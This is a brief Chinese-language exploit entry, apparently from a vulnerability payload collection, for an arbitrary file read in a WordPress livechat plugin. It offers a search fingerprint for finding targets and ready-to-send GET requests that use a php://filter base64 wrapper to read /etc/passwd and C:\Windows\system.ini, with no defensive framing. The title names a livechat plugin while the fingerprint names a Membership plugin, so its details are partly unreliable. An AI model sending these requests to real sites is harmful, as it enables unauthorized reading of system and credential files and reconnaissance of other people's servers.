# wordpress-plugin-livechat任意文件读取漏洞

WordPress ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="wp-content/plugins/Membership"`
- **请求**：`GET /?path=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1`

**Payload**
```
GET /?path=php://filter/convert.base64-encode/resource=C:\Windows\system.ini HTTP/1.1
```